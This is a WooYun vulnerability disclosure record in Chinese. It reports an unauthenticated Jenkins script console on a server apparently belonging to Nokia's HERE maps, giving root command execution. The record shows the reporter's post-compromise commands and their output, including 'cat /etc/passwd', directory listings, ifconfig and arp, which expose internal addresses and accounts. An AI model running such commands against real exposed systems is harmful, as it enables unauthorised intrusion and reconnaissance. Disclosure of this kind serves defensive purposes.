{"id": 87823, "wybug_id": "wooyun-2016-0218182", "wybug_title": "诺基亚旗下here地图国内某服务器第三方系统未授权访问(多项目源码泄露)导致命令执行                                      ", "wybug_corp": "诺基亚", "wybug_author": "路人甲", "wybug_date": "2016-06-11 12:08", "wybug_open_date": "2016-06-17 21:20", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["远程命令执行", "未授权访问"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-06-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-06-11：\t厂商已查看当前漏洞内容,细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-06-17：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： rt 上一个也是我提交的。。。 详细说明：  \n\nmask 区域\n1.http://**.**.**/_***************授权*****\n\n直接来命令执行  root 权限http://*.*.*.*:8089/computer/(master)/script\n\nls -al /home 看见一个here用户 怀疑是诺基亚的。\n\n然后一翻代码果然是。。看下面http://*.*.*.*:8089/job/MSP_China_Deployment_Check_F5_demo/lastSuccessfulBuild/artifact/MSP_China_Deployment_Check_F5/MSP_China_Deployment_Check_F5_Results.html\n\nls -al //var/lib/jenkins/jobs \n196drwxrwxrwx. 49 jenkins jenkins 4096 May 12 13:41 .drwxr-xr-x. 13 jenkins jenkins 4096 Jun  2 10:17 ..drwxrwxrwx.  3 root    root    4096 Nov 13 2015 MSP_China_Deployment_Check_DMRQA_hcwangdrwxrwxrwx.  4 root    root    4096 Nov 12 2015 MSP_China_Deployment_Check_F5drwxrwxrwx.  4 root    root    4096 Nov 12 2015 MSP_China_Deployment_Check_F51drwxrwxrwx.  4 root    root    4096 Nov 12 2015 MSP_China_Deployment_Check_F5_demodrwxrwxrwx.  3 root    root    4096 Nov 12 2015 MSP_China_Deployment_Check_Foreigndrwxrwxrwx.  3 root    root    4096 Nov 12 2015 MSP_China_Deployment_Check_Integrationdrwxrwxrwx.  3 root    root    4096 Nov 12 2015 MSP_China_Deployment_Check_Versiondrwxrwxrwx.  3 root    root    4096 Nov 12 2015 MSP_China_Regressiondrwxrwxrwx.  3 root    root    4096 Nov 12 2015 MSP_China_Test_Deployment_Case_Debugdrwxrwxrwx.  3 root    root    4096 Nov 12 2015 MSP_China_Test_Deployment_Check_CD03PRDdrwxrwxrwx.  3 root    root    4096 Nov 12 2015 MSP_China_Test_Deployment_Check_CD03QAdrwxrwxrwx.  3 root    root    4096 Nov 12 2015 MSP_China_Test_Deployment_Check_CD03STGdrwxrwxrwx.  3 root    root    4096 Nov 12 2015 MSP_China_Test_Deployment_Check_CD04PRDdrwxrwxrwx.  3 root    root    4096 Nov 12 2015 MSP_China_Test_Deployment_Check_CD04QAdrwxrwxrwx.  3 root    root    4096 Nov 12 2015 MSP_China_Test_Deployment_Check_CD04STGdrwxrwxrwx.  3 root    root    4096 Nov 12 2015 MSP_China_Test_Deployment_Check_CD05PRDdrwxrwxrwx.  3 root    root    4096 Nov 12 2015 MSP_China_Test_Deployment_Check_CD05QAdrwxrwxrwx.  3 root    root    4096 Nov 12 2015 MSP_China_Test_Deployment_Check_CD05STGdrwxrwxrwx.  3 root    root    4096 Nov 12 2015 MSP_China_Test_Deployment_Check_CD06PRDdrwxrwxrwx.  3 root    root    4096 Nov 12 2015 MSP_China_Test_Deployment_Check_CD06QAdrwxrwxrwx.  3 root    root    4096 Nov 12 2015 MSP_China_Test_Deployment_Check_CD06STGdrwxrwxrwx.  3 root    root    4096 Nov 12 2015 MSP_China_Test_Deployment_Check_CD07PRDdrwxrwxrwx.  3 root    root    4096 Nov 12 2015 MSP_China_Test_Deployment_Check_CD07QAdrwxrwxrwx.  3 root    root    4096 Nov 13 2015 MSP_China_Test_Deployment_Check_CD07STGdrwxrwxrwx.  3 root    root    4096 May 12 16:20 MSP_China_Test_Deployment_Check_CD08PRDdrwxrwxrwx.  3 root    root    4096 May 19 10:11 MSP_China_Test_Deployment_Check_CD08QAdrwxrwxrwx.  3 root    root    4096 May 12 16:19 MSP_China_Test_Deployment_Check_CD08STGdrwxrwxrwx.  3 jenkins jenkins 4096 Jun  6 11:37 MSP_China_Test_Deployment_Check_CD09PRDdrwxrwxrwx.  3 jenkins jenkins 4096 Jun  3 08:51 MSP_China_Test_Deployment_Check_CD09QAdrwxrwxrwx.  3 jenkins jenkins 4096 Jun  1 10:48 MSP_China_Test_Deployment_Check_CD09STGdrwxrwxrwx.  3 root    root    4096 Nov 12 2015 MSP_China_Test_Deployment_Check_legacydrwxrwxrwx.  3 root    root    4096 Nov 12 2015 MSP_China_Test_Deployment_Check_MCdrwxrwxrwx.  3 root    root    4096 Nov 12 2015 MSP_China_Test_Deployment_Check_PRDdrwxrwxrwx.  3 root    root    4096 Nov 12 2015 MSP_China_Test_Deployment_Check_QAdrwxrwxrwx.  5 root    root    4096 Nov 12 2015 MSP_China_Test_Deployment_Check_STGdrwxrwxrwx.  3 root    root    4096 Nov 12 2015 MSP_China_Test_Deployment_Check_Tempdrwxrwxrwx.  3 root    root    4096 Jun  3 10:01 MSP_China_Test_Deployment_Check_Testdrwxrwxrwx.  3 root    root    4096 Nov 12 2015 MSP_China_Test_Deployment_Check_Test12drwxrwxrwx.  3 root    root    4096 Nov 12 2015 MSP_CHINA_TEST_INTEGRATION_GeoRgeodrwxrwxrwx.  3 root    root    4096 Nov 12 2015 MSP_CHINA_TEST_INTEGRATION_MFS2drwxrwxrwx.  3 root    root    4096 Nov 12 2015 MSP_CHINA_TEST_INTEGRATION_MIAdrwxrwxrwx.  3 root    root    4096 Nov 12 2015 MSP_TEST_REGRESSION_GEORGEOdrwxrwxrwx.  3 root    root    4096 Nov 12 2015 THOR_China_Deployment_Check_PRDdrwxrwxrwx.  3 root    root    4096 Nov 12 2015 THOR_China_Deployment_Check_STGdrwxrwxrwx.  3 root    root    4096 Nov 12 2015 Thor_China_Test_Deployment_Check_dmrQA_LiRuidrwxrwxrwx.  3 root    root    4096 Nov 12 2015 Thor_China_Test_Deployment_Check_DMR_QA_zyxdrwxrwxrwx.  3 root    root    4096 Nov 12 2015 THOR_China_Test_Deployment_Check_SPS\nifconfig -a\neth0      Link encap:Ethernet  HWaddr 00:22:19:33:52:08            inet addr:192.168.69.9  Bcast:192.168.69.255  Mask:255.255.255.0          inet6 addr: fe80::222:19ff:fe33:5208/64 Scope:Link          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1          RX packets:1383001 errors:0 dropped:0 overruns:0 frame:0          TX packets:427222150 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:1000           RX bytes:1175852374 (1.0 GiB)  TX bytes:335780493196 (312.7 GiB)          Interrupt:17 lo        Link encap:Local Loopback            inet addr:127.0.0.1  Mask:255.0.0.0          inet6 addr: ::1/128 Scope:Host          UP LOOPBACK RUNNING  MTU:65536  Metric:1          RX packets:18 errors:0 dropped:0 overruns:0 frame:0          TX packets:18 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:0           RX bytes:940 (940.0 b)  TX bytes:940 (940.0 b)\narp -a? (192.168.69.110) at 00:25:ab:72:b5:e9 [ether] on eth0? (192.168.69.7) at b8:ac:6f:49:f0:eb [ether] on eth0? (192.168.69.101) at 28:d2:44:cf:ac:bf [ether] on eth0? (192.168.69.1) at 3c:46:d8:8e:0a:e1 [ether] on eth0? (192.168.69.109) at e8:9a:8f:96:35:2c [ether] on eth0? (192.168.69.105) at c4:34:6b:49:5d:7c [ether] on eth0   漏洞证明：  cat /etc/passwd\nroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mail:/var/spool/mail:/sbin/nologinuucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologinoperator:x:11:0:operator:/root:/sbin/nologingames:x:12:100:games:/usr/games:/sbin/nologingopher:x:13:30:gopher:/var/gopher:/sbin/nologinftp:x:14:50:FTP User:/var/ftp:/sbin/nologinnobody:x:99:99:Nobody:/:/sbin/nologindbus:x:81:81:System message bus:/:/sbin/nologinusbmuxd:x:113:113:usbmuxd user:/:/sbin/nologinvcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologinrpc:x:32:32:Rpcbind Daemon:/var/cache/rpcbind:/sbin/nologinrtkit:x:499:496:RealtimeKit:/proc:/sbin/nologinnscd:x:28:28:NSCD Daemon:/:/sbin/nologinavahi-autoipd:x:170:170:Avahi IPv4LL Stack:/var/lib/avahi-autoipd:/sbin/nologinabrt:x:173:173::/etc/abrt:/sbin/nologinrpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologinnfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologinsaslauth:x:498:76:Saslauthd user:/var/empty/saslauth:/sbin/nologinpostfix:x:89:89::/var/spool/postfix:/sbin/nologinmysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bashntp:x:38:38::/etc/ntp:/sbin/nologinhsqldb:x:96:96::/var/lib/hsqldb:/sbin/nologinapache:x:48:48:Apache:/var/www:/sbin/nologinhaldaemon:x:68:68:HAL daemon:/:/sbin/nologingdm:x:42:42::/var/lib/gdm:/sbin/nologinpulse:x:497:495:PulseAudio System Daemon:/var/run/pulse:/sbin/nologinsshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologinnslcd:x:65:55:LDAP Client User:/:/sbin/nologintcpdump:x:72:72::/:/sbin/nologinhere:x:500:501:here:/home/here:/bin/bashjenkins:x:496:491:Jenkins Continuous Build server:/var/lib/jenkins:/bin/false\n? (192.168.69.110) at 00:25:ab:72:b5:e9 [ether] on eth0? (192.168.69.7) at b8:ac:6f:49:f0:eb [ether] on eth0? (192.168.69.101) at 28:d2:44:cf:ac:bf [ether] on eth0? (192.168.69.1) at 3c:46:d8:8e:0a:e1 [ether] on eth0? (192.168.69.109) at e8:9a:8f:96:35:2c [ether] on eth0? (192.168.69.105) at c4:34:6b:49:5d:7c [ether] on eth0   修复方案：  上一个也是我提交的。   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2016-06-17 21:20 厂商回复：  漏洞Rank：15  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-06-11 14:29 |    \t\tFire ant \t\t\t( 普通白帽子  |\t\t\t        Rank:107 漏洞数:34        | 他们回来了................)\t\t \n  诺基亚不想和你说话并想你丢了一台N5630    \n     2016-06-11 16:17 |    \t\tj14n \t\t\t( 普通白帽子  |\t\t\t        Rank:2052 漏洞数:364        | weibo那个j14n不是我。)\t\t \n  @Fire ant 洞主已被诺基亚砸晕。    \n     2016-06-11 16:46 |    \t\t偶然 \t\t\t( 普通白帽子  |\t\t\t        Rank:603 漏洞数:142        | 我是天空里一片云。)\t\t \n  jenkins？    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}